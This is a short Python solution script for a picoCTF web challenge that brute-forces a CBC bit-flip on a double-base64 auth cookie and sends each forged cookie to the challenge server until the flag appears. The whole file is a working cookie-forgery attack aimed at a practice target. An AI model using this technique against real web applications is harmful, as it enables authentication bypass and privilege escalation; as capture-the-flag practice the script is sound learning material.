import requests
from base64 import b64decode, b64encode
from tqdm import tqdm

def bit_flip(pos, bit, data):
    raw = bytearray(b64decode(b64decode(data).decode()))
    raw[pos] = raw[pos] ^ bit
    return b64encode(b64encode(raw)).decode()

cookie = "a3RaMzlPR090bWUxbkh2cW1HVVl0aTFqMzlPbGVGcWYyNW90US91WDBJYmZFdUNtdWdJdkcwVEFTRHcwVlRRQ2RQY1Z5ZWJnb3AwMk02V0xYeFVZZmZCYTNyVkszSUdEcW5UQUZ6cy83anJUWWpCMFY1WkJKSTZJTXJzbXk2eTE="

for position_idx in tqdm(range(10), desc="Bruteforcing Position"):
    # The 96 really should be 128 to test every bit, but 96 worked for me.
    for bit_idx in tqdm(range(96), desc="Bruteforcing Bit"):
        auth_cookie = bit_flip(position_idx, bit_idx, cookie)
        cookies = {'auth_name': auth_cookie}
        r = requests.get('http://mercury.picoctf.net:21553/', cookies=cookies)
        if "picoCTF{" in r.text:
            # The flag is between `<code>` and `</code>`
            print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
            break
